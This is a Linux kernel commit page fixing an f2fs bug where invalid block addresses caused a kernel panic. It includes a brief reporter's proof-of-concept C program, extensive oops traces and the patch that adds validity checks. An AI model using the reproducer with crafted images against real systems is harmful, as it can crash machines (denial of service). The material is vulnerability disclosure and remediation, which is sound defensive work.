| parent | [bcbfbd604dcba45246dd307c8317f216ada5567d](/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=bcbfbd604dcba45246dd307c8317f216ada5567d) ([diff](/pub/scm/linux/kernel/git/torvalds/linux.git/diff/?id=91291e9998d208370eb8156c760691b873bd752&id2=bcbfbd604dcba45246dd307c8317f216ada5567d)) | |
| download | [linux-91291e9998d208370eb8156c760691b873bd752.tar.gz](/pub/scm/linux/kernel/git/torvalds/linux.git/snapshot/linux-91291e9998d208370eb8156c760691b873bd752.tar.gz) | |

f2fs: fix to do sanity check with block address in main area v2This patch adds f2fs\_is\_valid\_blkaddr() in below functions to do sanity
check with block address to avoid pentential panic:
- f2fs\_grab\_read\_bio()
- \_\_written\_first\_block()
https://bugzilla.kernel.org/show\_bug.cgi?id=200465
- Reproduce
- POC (poc.c)
#define \_GNU\_SOURCE
#include <sys/types.h>
#include <sys/mount.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/xattr.h>
#include <dirent.h>
#include <errno.h>
#include <error.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <linux/falloc.h>
#include <linux/loop.h>
static void activity(char \*mpoint) {
char \*xattr;
int err;
err = asprintf(&xattr, "%s/foo/bar/xattr", mpoint);
char buf2[113];
memset(buf2, 0, sizeof(buf2));
listxattr(xattr, buf2, sizeof(buf2));
}
int main(int argc, char \*argv[]) {
activity(argv[1]);
return 0;
}
- kernel message
[ 844.718738] F2FS-fs (loop0): Mounted with checkpoint version = 2
[ 846.430929] F2FS-fs (loop0): access invalid blkaddr:1024
[ 846.431058] WARNING: CPU: 1 PID: 1249 at fs/f2fs/checkpoint.c:154 f2fs\_is\_valid\_blkaddr+0x10f/0x160
[ 846.431059] Modules linked in: snd\_hda\_codec\_generic snd\_hda\_intel snd\_hda\_codec snd\_hda\_core snd\_hwdep snd\_pcm snd\_timer snd input\_leds joydev soundcore serio\_raw i2c\_piix4 mac\_hid ib\_iser rdma\_cm iw\_cm ib\_cm ib\_core configfs iscsi\_tcp libiscsi\_tcp libiscsi scsi\_transport\_iscsi autofs4 raid10 raid456 libcrc32c async\_raid6\_recov async\_memcpy async\_pq async\_xor xor async\_tx raid6\_pq raid1 raid0 multipath linear qxl ttm crct10dif\_pclmul crc32\_pclmul drm\_kms\_helper ghash\_clmulni\_intel syscopyarea sysfillrect sysimgblt fb\_sys\_fops pcbc drm 8139too aesni\_intel 8139cp floppy psmouse mii aes\_x86\_64 crypto\_simd pata\_acpi cryptd glue\_helper
[ 846.431310] CPU: 1 PID: 1249 Comm: a.out Not tainted 4.18.0-rc3+ #1
[ 846.431312] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS Ubuntu-1.8.2-1ubuntu1 04/01/2014
[ 846.431315] RIP: 0010:f2fs\_is\_valid\_blkaddr+0x10f/0x160
[ 846.431316] Code: 00 eb ed 31 c0 83 fa 05 75 ae 48 83 ec 08 48 8b 3f 89 f1 48 c7 c2 fc 0b 0f 8b 48 c7 c6 8b d7 09 8b 88 44 24 07 e8 61 8b ff ff <0f> 0b 0f b6 44 24 07 48 83 c4 08 eb 81 4c 8b 47 10 8b 8f 38 04 00
[ 846.431347] RSP: 0018:ffff961c414a7bc0 EFLAGS: 00010282
[ 846.431349] RAX: 0000000000000000 RBX: ffffc5f787b8ea80 RCX: 0000000000000000
[ 846.431350] RDX: 0000000000000000 RSI: ffff89dfffd165d8 RDI: ffff89dfffd165d8
[ 846.431351] RBP: ffff961c414a7c20 R08: 0000000000000001 R09: 0000000000000248
[ 846.431353] R10: 0000000000000000 R11: 0000000000000248 R12: 0000000000000007
[ 846.431369] R13: ffff89dff5492800 R14: ffff89dfae3aa000 R15: ffff89dff4ff88d0
[ 846.431372] FS: 00007f882e2fb700(0000) GS:ffff89dfffd00000(0000) knlGS:0000000000000000
[ 846.431373] CS: 0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[ 846.431374] CR2: 0000000001a88008 CR3: 00000001eb572000 CR4: 00000000000006e0
[ 846.431384] Call Trace:
[ 846.431426] f2fs\_iget+0x6f4/0xe70
[ 846.431430] ? f2fs\_find\_entry+0x71/0x90
[ 846.431432] f2fs\_lookup+0x1aa/0x390
[ 846.431452] \_\_lookup\_slow+0x97/0x150
[ 846.431459] lookup\_slow+0x35/0x50
[ 846.431462] walk\_component+0x1c6/0x470
[ 846.431479] ? memcg\_kmem\_charge\_memcg+0x70/0x90
[ 846.431488] ? page\_add\_file\_rmap+0x13/0x200
[ 846.431491] path\_lookupat+0x76/0x230
[ 846.431501] ? \_\_alloc\_pages\_nodemask+0xfc/0x280
[ 846.431504] filename\_lookup+0xb8/0x1a0
[ 846.431534] ? \_cond\_resched+0x16/0x40
[ 846.431541] ? kmem\_cache\_alloc+0x160/0x1d0
[ 846.431549] ? path\_listxattr+0x41/0xa0
[ 846.431551] path\_listxattr+0x41/0xa0
[ 846.431570] do\_syscall\_64+0x55/0x100
[ 846.431583] entry\_SYSCALL\_64\_after\_hwframe+0x44/0xa9
[ 846.431607] RIP: 0033:0x7f882de1c0d7
[ 846.431607] Code: f0 ff ff 73 01 c3 48 8b 0d be dd 2b 00 f7 d8 64 89 01 48 83 c8 ff c3 66 2e 0f 1f 84 00 00 00 00 00 66 90 b8 c2 00 00 00 0f 05 <48> 3d 01 f0 ff ff 73 01 c3 48 8b 0d 91 dd 2b 00 f7 d8 64 89 01 48
[ 846.431639] RSP: 002b:00007ffe8e66c238 EFLAGS: 00000202 ORIG\_RAX: 00000000000000c2
[ 846.431641] RAX: ffffffffffffffda RBX: 0000000000000000 RCX: 00007f882de1c0d7
[ 846.431642] RDX: 0000000000000071 RSI: 00007ffe8e66c280 RDI: 0000000001a880c0
[ 846.431643] RBP: 00007ffe8e66c300 R08: 0000000001a88010 R09: 0000000000000000
[ 846.431645] R10: 00000000000001ab R11: 0000000000000202 R12: 0000000000400550
[ 846.431646] R13: 00007ffe8e66c400 R14: 0000000000000000 R15: 0000000000000000
[ 846.431648] ---[ end trace abca54df39d14f5c ]---
[ 846.431651] F2FS-fs (loop0): invalid blkaddr: 1024, type: 5, run fsck to fix.
[ 846.431762] WARNING: CPU: 1 PID: 1249 at fs/f2fs/f2fs.h:2697 f2fs\_iget+0xd17/0xe70
[ 846.431763] Modules linked in: snd\_hda\_codec\_generic snd\_hda\_intel snd\_hda\_codec snd\_hda\_core snd\_hwdep snd\_pcm snd\_timer snd input\_leds joydev soundcore serio\_raw i2c\_piix4 mac\_hid ib\_iser rdma\_cm iw\_cm ib\_cm ib\_core configfs iscsi\_tcp libiscsi\_tcp libiscsi scsi\_transport\_iscsi autofs4 raid10 raid456 libcrc32c async\_raid6\_recov async\_memcpy async\_pq async\_xor xor async\_tx raid6\_pq raid1 raid0 multipath linear qxl ttm crct10dif\_pclmul crc32\_pclmul drm\_kms\_helper ghash\_clmulni\_intel syscopyarea sysfillrect sysimgblt fb\_sys\_fops pcbc drm 8139too aesni\_intel 8139cp floppy psmouse mii aes\_x86\_64 crypto\_simd pata\_acpi cryptd glue\_helper
[ 846.431797] CPU: 1 PID: 1249 Comm: a.out Tainted: G W 4.18.0-rc3+ #1
[ 846.431798] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS Ubuntu-1.8.2-1ubuntu1 04/01/2014
[ 846.431800] RIP: 0010:f2fs\_iget+0xd17/0xe70
[ 846.431801] Code: ff ff 48 63 d8 e9 e1 f6 ff ff 48 8b 45 c8 41 b8 05 00 00 00 48 c7 c2 d8 e8 0e 8b 48 c7 c6 1d b0 0a 8b 48 8b 38 e8 f9 b4 00 00 <0f> 0b 48 8b 45 c8 f0 80 48 48 04 e9 d8 f9 ff ff 0f 0b 48 8b 43 18
[ 846.431832] RSP: 0018:ffff961c414a7bd0 EFLAGS: 00010282
[ 846.431834] RAX: 0000000000000000 RBX: ffffc5f787b8ea80 RCX: 0000000000000006
[ 846.431835] RDX: 0000000000000000 RSI: 0000000000000096 RDI: ffff89dfffd165d0
[ 846.431836] RBP: ffff961c414a7c20 R08: 0000000000000000 R09: 0000000000000273
[ 846.431837] R10: 0000000000000000 R11: ffff89dfad50ca60 R12: 0000000000000007
[ 846.431838] R13: ffff89dff5492800 R14: ffff89dfae3aa000 R15: ffff89dff4ff88d0
[ 846.431840] FS: 00007f882e2fb700(0000) GS:ffff89dfffd00000(0000) knlGS:0000000000000000
[ 846.431841] CS: 0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[ 846.431842] CR2: 0000000001a88008 CR3: 00000001eb572000 CR4: 00000000000006e0
[ 846.431846] Call Trace:
[ 846.431850] ? f2fs\_find\_entry+0x71/0x90
[ 846.431853] f2fs\_lookup+0x1aa/0x390
[ 846.431856] \_\_lookup\_slow+0x97/0x150
[ 846.431858] lookup\_slow+0x35/0x50
[ 846.431874] walk\_component+0x1c6/0x470
[ 846.431878] ? memcg\_kmem\_charge\_memcg+0x70/0x90
[ 846.431880] ? page\_add\_file\_rmap+0x13/0x200
[ 846.431882] path\_lookupat+0x76/0x230
[ 846.431884] ? \_\_alloc\_pages\_nodemask+0xfc/0x280
[ 846.431886] filename\_lookup+0xb8/0x1a0
[ 846.431890] ? \_cond\_resched+0x16/0x40
[ 846.431891] ? kmem\_cache\_alloc+0x160/0x1d0
[ 846.431894] ? path\_listxattr+0x41/0xa0
[ 846.431896] path\_listxattr+0x41/0xa0
[ 846.431898] do\_syscall\_64+0x55/0x100
[ 846.431901] entry\_SYSCALL\_64\_after\_hwframe+0x44/0xa9
[ 846.431902] RIP: 0033:0x7f882de1c0d7
[ 846.431903] Code: f0 ff ff 73 01 c3 48 8b 0d be dd 2b 00 f7 d8 64 89 01 48 83 c8 ff c3 66 2e 0f 1f 84 00 00 00 00 00 66 90 b8 c2 00 00 00 0f 05 <48> 3d 01 f0 ff ff 73 01 c3 48 8b 0d 91 dd 2b 00 f7 d8 64 89 01 48
[ 846.431934] RSP: 002b:00007ffe8e66c238 EFLAGS: 00000202 ORIG\_RAX: 00000000000000c2
[ 846.431936] RAX: ffffffffffffffda RBX: 0000000000000000 RCX: 00007f882de1c0d7
[ 846.431937] RDX: 0000000000000071 RSI: 00007ffe8e66c280 RDI: 0000000001a880c0
[ 846.431939] RBP: 00007ffe8e66c300 R08: 0000000001a88010 R09: 0000000000000000
[ 846.431940] R10: 00000000000001ab R11: 0000000000000202 R12: 0000000000400550
[ 846.431941] R13: 00007ffe8e66c400 R14: 0000000000000000 R15: 0000000000000000
[ 846.431943] ---[ end trace abca54df39d14f5d ]---
[ 846.432033] F2FS-fs (loop0): access invalid blkaddr:1024
[ 846.432051] WARNING: CPU: 1 PID: 1249 at fs/f2fs/checkpoint.c:154 f2fs\_is\_valid\_blkaddr+0x10f/0x160
[ 846.432051] Modules linked in: snd\_hda\_codec\_generic snd\_hda\_intel snd\_hda\_codec snd\_hda\_core snd\_hwdep snd\_pcm snd\_timer snd input\_leds joydev soundcore serio\_raw i2c\_piix4 mac\_hid ib\_iser rdma\_cm iw\_cm ib\_cm ib\_core configfs iscsi\_tcp libiscsi\_tcp libiscsi scsi\_transport\_iscsi autofs4 raid10 raid456 libcrc32c async\_raid6\_recov async\_memcpy async\_pq async\_xor xor async\_tx raid6\_pq raid1 raid0 multipath linear qxl ttm crct10dif\_pclmul crc32\_pclmul drm\_kms\_helper ghash\_clmulni\_intel syscopyarea sysfillrect sysimgblt fb\_sys\_fops pcbc drm 8139too aesni\_intel 8139cp floppy psmouse mii aes\_x86\_64 crypto\_simd pata\_acpi cryptd glue\_helper
[ 846.432085] CPU: 1 PID: 1249 Comm: a.out Tainted: G W 4.18.0-rc3+ #1
[ 846.432086] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS Ubuntu-1.8.2-1ubuntu1 04/01/2014
[ 846.432089] RIP: 0010:f2fs\_is\_valid\_blkaddr+0x10f/0x160
[ 846.432089] Code: 00 eb ed 31 c0 83 fa 05 75 ae 48 83 ec 08 48 8b 3f 89 f1 48 c7 c2 fc 0b 0f 8b 48 c7 c6 8b d7 09 8b 88 44 24 07 e8 61 8b ff ff <0f> 0b 0f b6 44 24 07 48 83 c4 08 eb 81 4c 8b 47 10 8b 8f 38 04 00
[ 846.432120] RSP: 0018:ffff961c414a7900 EFLAGS: 00010286
[ 846.432122] RAX: 0000000000000000 RBX: 0000000000000400 RCX: 0000000000000006
[ 846.432123] RDX: 0000000000000000 RSI: 0000000000000096 RDI: ffff89dfffd165d0
[ 846.432124] RBP: ffff89dff5492800 R08: 0000000000000001 R09: 000000000000029d
[ 846.432125] R10: ffff961c414a7820 R11: 000000000000029d R12: 0000000000000400
[ 846.432126] R13: 0000000000000000 R14: ffff89dff4ff88d0 R15: 0000000000000000
[ 846.432128] FS: 00007f882e2fb700(0000) GS:ffff89dfffd00000(0000) knlGS:0000000000000000
[ 846.432130] CS: 0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[ 846.432131] CR2: 0000000001a88008 CR3: 00000001eb572000 CR4: 00000000000006e0
[ 846.432135] Call Trace:
[ 846.432151] f2fs\_wait\_on\_block\_writeback+0x20/0x110
[ 846.432158] f2fs\_grab\_read\_bio+0xbc/0xe0
[ 846.432161] f2fs\_submit\_page\_read+0x21/0x280
[ 846.432163] f2fs\_get\_read\_data\_page+0xb7/0x3c0
[ 846.432165] f2fs\_get\_lock\_data\_page+0x29/0x1e0
[ 846.432167] f2fs\_get\_new\_data\_page+0x148/0x550
[ 846.432170] f2fs\_add\_regular\_entry+0x1d2/0x550
[ 846.432178] ? \_\_switch\_to+0x12f/0x460
[ 846.432181] f2fs\_add\_dentry+0x6a/0xd0
[ 846.432184] f2fs\_do\_add\_link+0xe9/0x140
[ 846.432186] \_\_recover\_dot\_dentries+0x260/0x280
[ 846.432189] f2fs\_lookup+0x343/0x390
[ 846.432193] \_\_lookup\_slow+0x97/0x150
[ 846.432195] lookup\_slow+0x35/0x50
[ 846.432208] walk\_component+0x1c6/0x470
[ 846.432212] ? memcg\_kmem\_charge\_memcg+0x70/0x90
[ 846.432215] ? page\_add\_file\_rmap+0x13/0x200
[ 846.432217] path\_lookupat+0x76/0x230
[ 846.432219] ? \_\_alloc\_pages\_nodemask+0xfc/0x280
[ 846.432221] filename\_lookup+0xb8/0x1a0
[ 846.432224] ? \_cond\_resched+0x16/0x40
[ 846.432226] ? kmem\_cache\_alloc+0x160/0x1d0
[ 846.432228] ? path\_listxattr+0x41/0xa0
[ 846.432230] path\_listxattr+0x41/0xa0
[ 846.432233] do\_syscall\_64+0x55/0x100
[ 846.432235] entry\_SYSCALL\_64\_after\_hwframe+0x44/0xa9
[ 846.432237] RIP: 0033:0x7f882de1c0d7
[ 846.432237] Code: f0 ff ff 73 01 c3 48 8b 0d be dd 2b 00 f7 d8 64 89 01 48 83 c8 ff c3 66 2e 0f 1f 84 00 00 00 00 00 66 90 b8 c2 00 00 00 0f 05 <48> 3d 01 f0 ff ff 73 01 c3 48 8b 0d 91 dd 2b 00 f7 d8 64 89 01 48
[ 846.432269] RSP: 002b:00007ffe8e66c238 EFLAGS: 00000202 ORIG\_RAX: 00000000000000c2
[ 846.432271] RAX: ffffffffffffffda RBX: 0000000000000000 RCX: 00007f882de1c0d7
[ 846.432272] RDX: 0000000000000071 RSI: 00007ffe8e66c280 RDI: 0000000001a880c0
[ 846.432273] RBP: 00007ffe8e66c300 R08: 0000000001a88010 R09: 0000000000000000
[ 846.432274] R10: 00000000000001ab R11: 0000000000000202 R12: 0000000000400550
[ 846.432275] R13: 00007ffe8e66c400 R14: 0000000000000000 R15: 0000000000000000
[ 846.432277] ---[ end trace abca54df39d14f5e ]---
[ 846.432279] F2FS-fs (loop0): invalid blkaddr: 1024, type: 5, run fsck to fix.
[ 846.432376] WARNING: CPU: 1 PID: 1249 at fs/f2fs/f2fs.h:2697 f2fs\_wait\_on\_block\_writeback+0xb1/0x110
[ 846.432376] Modules linked in: snd\_hda\_codec\_generic snd\_hda\_intel snd\_hda\_codec snd\_hda\_core snd\_hwdep snd\_pcm snd\_timer snd input\_leds joydev soundcore serio\_raw i2c\_piix4 mac\_hid ib\_iser rdma\_cm iw\_cm ib\_cm ib\_core configfs iscsi\_tcp libiscsi\_tcp libiscsi scsi\_transport\_iscsi autofs4 raid10 raid456 libcrc32c async\_raid6\_recov async\_memcpy async\_pq async\_xor xor async\_tx raid6\_pq raid1 raid0 multipath linear qxl ttm crct10dif\_pclmul crc32\_pclmul drm\_kms\_helper ghash\_clmulni\_intel syscopyarea sysfillrect sysimgblt fb\_sys\_fops pcbc drm 8139too aesni\_intel 8139cp floppy psmouse mii aes\_x86\_64 crypto\_simd pata\_acpi cryptd glue\_helper
[ 846.432410] CPU: 1 PID: 1249 Comm: a.out Tainted: G W 4.18.0-rc3+ #1
[ 846.432411] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS Ubuntu-1.8.2-1ubuntu1 04/01/2014
[ 846.432413] RIP: 0010:f2fs\_wait\_on\_block\_writeback+0xb1/0x110
[ 846.432414] Code: 66 90 f0 ff 4b 34 74 59 5b 5d c3 48 8b 7d 00 41 b8 05 00 00 00 89 d9 48 c7 c2 d8 e8 0e 8b 48 c7 c6 1d b0 0a 8b e8 df bc fd ff <0f> 0b f0 80 4d 48 04 e9 67 ff ff ff 48 8b 03 48 c1 e8 37 83 e0 07
[ 846.432445] RSP: 0018:ffff961c414a7910 EFLAGS: 00010286
[ 846.432447] RAX: 0000000000000000 RBX: 0000000000000400 RCX: 0000000000000006
[ 846.432448] RDX: 0000000000000000 RSI: 0000000000000092 RDI: ffff89dfffd165d0
[ 846.432449] RBP: ffff89dff5492800 R08: 0000000000000000 R09: 00000000000002d1
[ 846.432450] R10: ffff961c414a7820 R11: ffff89dfad50cf80 R12: 0000000000000400
[ 846.432451] R13: 0000000000000000 R14: ffff89dff4ff88d0 R15: 0000000000000000
[ 846.432453] FS: 00007f882e2fb700(0000) GS:ffff89dfffd00000(0000) knlGS:0000000000000000
[ 846.432454] CS: 0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[ 846.432455] CR2: 0000000001a88008 CR3: 00000001eb572000 CR4: 00000000000006e0
[ 846.432459] Call Trace:
[ 846.432463] f2fs\_grab\_read\_bio+0xbc/0xe0
[ 846.432464] f2fs\_submit\_page\_read+0x21/0x280
[ 846.432466] f2fs\_get\_read\_data\_page+0xb7/0x3c0
[ 846.432468] f2fs\_get\_lock\_data\_page+0x29/0x1e0
[ 846.432470] f2fs\_get\_new\_data\_page+0x148/0x550
[ 846.432473] f2fs\_add\_regular\_entry+0x1d2/0x550
[ 846.432475] ? \_\_switch\_to+0x12f/0x460
[ 846.432477] f2fs\_add\_dentry+0x6a/0xd0
[ 846.432480] f2fs\_do\_add\_link+0xe9/0x140
[ 846.432483] \_\_recover\_dot\_dentries+0x260/0x280
[ 846.432485] f2fs\_lookup+0x343/0x390
[ 846.432488] \_\_lookup\_slow+0x97/0x150
[ 846.432490] lookup\_slow+0x35/0x50
[ 846.432505] walk\_component+0x1c6/0x470
[ 846.432509] ? memcg\_kmem\_charge\_memcg+0x70/0x90
[ 846.432511] ? page\_add\_file\_rmap+0x13/0x200
[ 846.432513] path\_lookupat+0x76/0x230
[ 846.432515] ? \_\_alloc\_pages\_nodemask+0xfc/0x280
[ 846.432517] filename\_lookup+0xb8/0x1a0
[ 846.432520] ? \_cond\_resched+0x16/0x40
[ 846.432522] ? kmem\_cache\_alloc+0x160/0x1d0
[ 846.432525] ? path\_listxattr+0x41/0xa0
[ 846.432526] path\_listxattr+0x41/0xa0
[ 846.432529] do\_syscall\_64+0x55/0x100
[ 846.432531] entry\_SYSCALL\_64\_after\_hwframe+0x44/0xa9
[ 846.432533] RIP: 0033:0x7f882de1c0d7
[ 846.432533] Code: f0 ff ff 73 01 c3 48 8b 0d be dd 2b 00 f7 d8 64 89 01 48 83 c8 ff c3 66 2e 0f 1f 84 00 00 00 00 00 66 90 b8 c2 00 00 00 0f 05 <48> 3d 01 f0 ff ff 73 01 c3 48 8b 0d 91 dd 2b 00 f7 d8 64 89 01 48
[ 846.432565] RSP: 002b:00007ffe8e66c238 EFLAGS: 00000202 ORIG\_RAX: 00000000000000c2
[ 846.432567] RAX: ffffffffffffffda RBX: 0000000000000000 RCX: 00007f882de1c0d7
[ 846.432568] RDX: 0000000000000071 RSI: 00007ffe8e66c280 RDI: 0000000001a880c0
[ 846.432569] RBP: 00007ffe8e66c300 R08: 0000000001a88010 R09: 0000000000000000
[ 846.432570] R10: 00000000000001ab R11: 0000000000000202 R12: 0000000000400550
[ 846.432571] R13: 00007ffe8e66c400 R14: 0000000000000000 R15: 0000000000000000
[ 846.432573] ---[ end trace abca54df39d14f5f ]---
[ 846.434280] BUG: unable to handle kernel NULL pointer dereference at 0000000000000008
[ 846.434424] PGD 80000001ebd3a067 P4D 80000001ebd3a067 PUD 1eb1ae067 PMD 0
[ 846.434551] Oops: 0000 [#1] SMP PTI
[ 846.434697] CPU: 0 PID: 44 Comm: kworker/u5:0 Tainted: G W 4.18.0-rc3+ #1
[ 846.434805] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS Ubuntu-1.8.2-1ubuntu1 04/01/2014
[ 846.435000] Workqueue: fscrypt\_read\_queue decrypt\_work
[ 846.435174] RIP: 0010:fscrypt\_do\_page\_crypto+0x6e/0x2d0
[ 846.435351] Code: 00 65 48 8b 04 25 28 00 00 00 48 89 84 24 88 00 00 00 31 c0 e8 43 c2 e0 ff 49 8b 86 48 02 00 00 85 ed c7 44 24 70 00 00 00 00 <48> 8b 58 08 0f 84 14 02 00 00 48 8b 78 10 48 8b 0c 24 48 c7 84 24
[ 846.435696] RSP: 0018:ffff961c40f9bd60 EFLAGS: 00010206
[ 846.435870] RAX: 0000000000000000 RBX: ffffc5f787719b80 RCX: ffffc5f787719b80
[ 846.436051] RDX: ffffffff8b9f4b88 RSI: ffffffff8b0ae622 RDI: ffff961c40f9bdb8
[ 846.436261] RBP: 0000000000001000 R08: ffffc5f787719b80 R09: 0000000000001000
[ 846.436433] R10: 0000000000000018 R11: fefefefefefefeff R12: ffffc5f787719b80
[ 846.436562] R13: ffffc5f787719b80 R14: ffff89dff4ff88d0 R15: 0ffff89dfaddee60
[ 846.436658] FS: 0000000000000000(0000) GS:ffff89dfffc00000(0000) knlGS:0000000000000000
[ 846.436758] CS: 0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[ 846.436898] CR2: 0000000000000008 CR3: 00000001eddd0000 CR4: 00000000000006f0
[ 846.437001] Call Trace:
[ 846.437181] ? check\_preempt\_wakeup+0xf2/0x230
[ 846.437276] ? check\_preempt\_curr+0x7c/0x90
[ 846.437370] fscrypt\_decrypt\_page+0x48/0x4d
[ 846.437466] \_\_fscrypt\_decrypt\_bio+0x5b/0x90
[ 846.437542] decrypt\_work+0x12/0x20
[ 846.437651] process\_one\_work+0x15e/0x3d0
[ 846.437740] worker\_thread+0x4c/0x440
[ 846.437848] kthread+0xf8/0x130
[ 846.437938] ? rescuer\_thread+0x350/0x350
[ 846.438022] ? kthread\_associate\_blkcg+0x90/0x90
[ 846.438117] ret\_from\_fork+0x35/0x40
[ 846.438201] Modules linked in: snd\_hda\_codec\_generic snd\_hda\_intel snd\_hda\_codec snd\_hda\_core snd\_hwdep snd\_pcm snd\_timer snd input\_leds joydev soundcore serio\_raw i2c\_piix4 mac\_hid ib\_iser rdma\_cm iw\_cm ib\_cm ib\_core configfs iscsi\_tcp libiscsi\_tcp libiscsi scsi\_transport\_iscsi autofs4 raid10 raid456 libcrc32c async\_raid6\_recov async\_memcpy async\_pq async\_xor xor async\_tx raid6\_pq raid1 raid0 multipath linear qxl ttm crct10dif\_pclmul crc32\_pclmul drm\_kms\_helper ghash\_clmulni\_intel syscopyarea sysfillrect sysimgblt fb\_sys\_fops pcbc drm 8139too aesni\_intel 8139cp floppy psmouse mii aes\_x86\_64 crypto\_simd pata\_acpi cryptd glue\_helper
[ 846.438653] CR2: 0000000000000008
[ 846.438713] ---[ end trace abca54df39d14f60 ]---
[ 846.438796] RIP: 0010:fscrypt\_do\_page\_crypto+0x6e/0x2d0
[ 846.438844] Code: 00 65 48 8b 04 25 28 00 00 00 48 89 84 24 88 00 00 00 31 c0 e8 43 c2 e0 ff 49 8b 86 48 02 00 00 85 ed c7 44 24 70 00 00 00 00 <48> 8b 58 08 0f 84 14 02 00 00 48 8b 78 10 48 8b 0c 24 48 c7 84 24
[ 846.439084] RSP: 0018:ffff961c40f9bd60 EFLAGS: 00010206
[ 846.439176] RAX: 0000000000000000 RBX: ffffc5f787719b80 RCX: ffffc5f787719b80
[ 846.440927] RDX: ffffffff8b9f4b88 RSI: ffffffff8b0ae622 RDI: ffff961c40f9bdb8
[ 846.442083] RBP: 0000000000001000 R08: ffffc5f787719b80 R09: 0000000000001000
[ 846.443284] R10: 0000000000000018 R11: fefefefefefefeff R12: ffffc5f787719b80
[ 846.444448] R13: ffffc5f787719b80 R14: ffff89dff4ff88d0 R15: 0ffff89dfaddee60
[ 846.445558] FS: 0000000000000000(0000) GS:ffff89dfffc00000(0000) knlGS:0000000000000000
[ 846.446687] CS: 0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[ 846.447796] CR2: 0000000000000008 CR3: 00000001eddd0000 CR4: 00000000000006f0
- Location
https://elixir.bootlin.com/linux/v4.18-rc4/source/fs/crypto/crypto.c#L149
struct crypto\_skcipher \*tfm = ci->ci\_ctfm;
Here ci can be NULL
Note that this issue maybe require CONFIG\_F2FS\_FS\_ENCRYPTION=y to reproduce.
Reported-by Wen Xu <wen.xu@gatech.edu>
Signed-off-by: Chao Yu <yuchao0@huawei.com>
Signed-off-by: Jaegeuk Kim <jaegeuk@kernel.org>
[Diffstat](/pub/scm/linux/kernel/git/torvalds/linux.git/diff/?id=91291e9998d208370eb8156c760691b873bd752)

| -rw-r--r-- | [fs/f2fs/data.c](/pub/scm/linux/kernel/git/torvalds/linux.git/diff/fs/f2fs/data.c?id=91291e9998d208370eb8156c760691b873bd752) | 3 | |  |  |  | | --- | --- | --- | |
| --- | --- | --- | --- | --- | --- | --- |
| -rw-r--r-- | [fs/f2fs/inode.c](/pub/scm/linux/kernel/git/torvalds/linux.git/diff/fs/f2fs/inode.c?id=91291e9998d208370eb8156c760691b873bd752) | 18 | |  |  |  | | --- | --- | --- | |

2 files changed, 16 insertions, 5 deletions

| diff --git a/fs/f2fs/data.c b/fs/f2fs/data.cindex 363520ee099a1d..1e6cc68fb7c472 100644--- a/[fs/f2fs/data.c](/pub/scm/linux/kernel/git/torvalds/linux.git/tree/fs/f2fs/data.c?id=bcbfbd604dcba45246dd307c8317f216ada5567d)+++ b/[fs/f2fs/data.c](/pub/scm/linux/kernel/git/torvalds/linux.git/tree/fs/f2fs/data.c?id=91291e9998d208370eb8156c760691b873bd7522)@@ -546,6 +546,9 @@ static struct bio \*f2fs\_grab\_read\_bio(struct inode \*inode, block\_t blkaddr, struct bio\_post\_read\_ctx \*ctx; unsigned int post\_read\_steps = 0; + if (!f2fs\_is\_valid\_blkaddr(sbi, blkaddr, DATA\_GENERIC))+ return ERR\_PTR(-EFAULT);+ bio = f2fs\_bio\_alloc(sbi, min\_t(int, nr\_pages, BIO\_MAX\_PAGES), false); if (!bio) return ERR\_PTR(-ENOMEM);diff --git a/fs/f2fs/inode.c b/fs/f2fs/inode.cindex aa343a5cab4455..fc2c98b9e255b4 100644--- a/[fs/f2fs/inode.c](/pub/scm/linux/kernel/git/torvalds/linux.git/tree/fs/f2fs/inode.c?id=bcbfbd604dcba45246dd307c8317f216ada5567d)+++ b/[fs/f2fs/inode.c](/pub/scm/linux/kernel/git/torvalds/linux.git/tree/fs/f2fs/inode.c?id=91291e9998d208370eb8156c760691b873bd7522)@@ -68,14 +68,16 @@ static void \_\_get\_inode\_rdev(struct inode \*inode, struct f2fs\_inode \*ri) } } -static bool \_\_written\_first\_block(struct f2fs\_sb\_info \*sbi,+static int \_\_written\_first\_block(struct f2fs\_sb\_info \*sbi, struct f2fs\_inode \*ri) { block\_t addr = le32\_to\_cpu(ri->i\_addr[offset\_in\_addr(ri)]); - if (is\_valid\_data\_blkaddr(sbi, addr))- return true;- return false;+ if (!\_\_is\_valid\_data\_blkaddr(addr))+ return 1;+ if (!f2fs\_is\_valid\_blkaddr(sbi, addr, DATA\_GENERIC))+ return -EFAULT;+ return 0; }  static void \_\_set\_inode\_rdev(struct inode \*inode, struct f2fs\_inode \*ri)@@ -295,6 +297,7 @@ static int do\_read\_inode(struct inode \*inode) struct page \*node\_page; struct f2fs\_inode \*ri; projid\_t i\_projid;+ int err;  /\* Check if ino is within scope \*/ if (f2fs\_check\_nid\_range(sbi, inode->i\_ino))@@ -368,7 +371,12 @@ static int do\_read\_inode(struct inode \*inode) /\* get rdev by using inline\_info \*/ \_\_get\_inode\_rdev(inode, ri); - if (\_\_written\_first\_block(sbi, ri))+ err = \_\_written\_first\_block(sbi, ri);+ if (err < 0) {+ f2fs\_put\_page(node\_page, 1);+ return err;+ }+ if (!err) set\_inode\_flag(inode, FI\_FIRST\_BLOCK\_WRITTEN);  if (!f2fs\_need\_inode\_block\_update(sbi, inode->i\_ino)) |
| --- |

generated by [cgit 1.2.3-korg](https://git.zx2c4.com/cgit/about/) ([git 2.43.0](https://git-scm.com/)) at 2025-01-26 12:05:41 +0000


